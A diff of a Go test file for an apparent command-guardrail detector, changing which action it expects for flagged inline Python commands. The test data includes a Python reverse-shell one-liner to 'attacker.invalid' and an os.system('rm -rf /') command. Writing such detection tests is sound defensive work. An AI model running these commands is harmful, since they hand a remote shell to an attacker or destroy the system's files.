@@ -184,19 +184,26 @@ func TestPythonInlineSpecificOwnersRemainDetectionOnlyWithoutTypedProof(t *testi
 	installDefaultProfileConnector(t, connector)
 
 	for _, test := range []struct {
-		name    string
-		command string
-		ruleID  string
+		name       string
+		command    string
+		ruleID     string
+		wantAction string
 	}{
 		{
-			name:    "reverse shell",
-			command: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker.invalid",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
-			ruleID:  "CMD-REVSHELL-PYTHON",
+			// A one-liner that asks for a network connection and a process
+			// spawn is opaque code with network and exec: it alerts
+			// (exec.inline_code_network_and_exec) while the specific owner
+			// stays audit-only without typed proof.
+			name:       "reverse shell",
+			wantAction: guardrailActionAlert,
+			command:    `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("attacker.invalid",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
+			ruleID:     "CMD-REVSHELL-PYTHON",
 		},
 		{
-			name:    "destructive child command",
-			command: `python3 -c 'import os; os.system("rm -rf /")'`,
-			ruleID:  "CMD-RM-RF",
+			name:       "destructive child command",
+			command:    `python3 -c 'import os; os.system("rm -rf /")'`,
+			ruleID:     "CMD-RM-RF",
+			wantAction: guardrailActionAllow,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -215,7 +222,7 @@ func TestPythonInlineSpecificOwnersRemainDetectionOnlyWithoutTypedProof(t *testi
 				},
 			)
 			owner := findingWithID(verdict.DetailedFindings, test.ruleID)
-			if verdict.Action != guardrailActionAllow || verdict.Severity != "CRITICAL" ||
+			if verdict.Action != test.wantAction || verdict.Severity != "CRITICAL" ||
 				owner == nil || owner.contributesToEnforcement() {
 				t.Fatalf("verdict = %+v, owner = %+v, want retained audit-only owner without typed proof", verdict, owner)
 			}
